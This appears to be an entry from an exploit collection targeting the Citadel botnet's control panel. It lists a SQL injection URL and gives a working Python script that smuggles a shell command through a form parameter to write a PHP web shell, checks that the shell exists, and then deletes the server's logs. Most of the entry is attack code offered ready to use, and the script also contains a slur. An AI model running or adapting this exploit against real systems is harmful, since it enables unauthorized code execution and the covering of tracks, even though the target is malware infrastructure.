#### Citadel

Type: SQLi
```
Vuln: http://localhost/cp.php?bots=1
```

Type: Remote Code Execution

Author: [Xylitol](https://twitter.com/Xylit0l)


```
import urllib
import urllib2

# Citadel Backconnect Server 1.3.5.1 Remote Code Execution vulnerability
# Work only on windows box

def request(url, params=None, method='GET'):
        if method == 'POST':
                urllib2.urlopen(url, urllib.urlencode(params)).read()
        elif method == 'GET':
                if params == None:
                        urllib2.urlopen(url)
                else:
                        urllib2.urlopen(url + '?' + urllib.urlencode(params)).read()

def uploadShell(url, filename, payload):
        data = {
                'b'  : 'tapz',
                'p1' : 'faggot',
                'p2' : 'hacker | echo "' + payload + '" >> ' + filename
        }
        request(url + 'test.php', data)

def shellExists(url):
        return urllib.urlopen(url).getcode() == 200

def cleanLogs(url):
        delete = {
                'delete' : ''
        }
        request(URL + 'control.php', delete, 'POST')

URL      = 'http://localhost/citadel/winserv_php_gate/'
FILENAME = 'shell.php'
PAYLOAD  = '<?php phpinfo(); ?>'

uploadShell(URL, FILENAME, PAYLOAD)
print '[~] Shell created!'
if not shellExists(URL + FILENAME):
        print '[-]', FILENAME, 'not found...'
else:
        print '[+] Go to:', URL + FILENAME
cleanLogs(URL)
print '[~] Logs cleaned!'
```
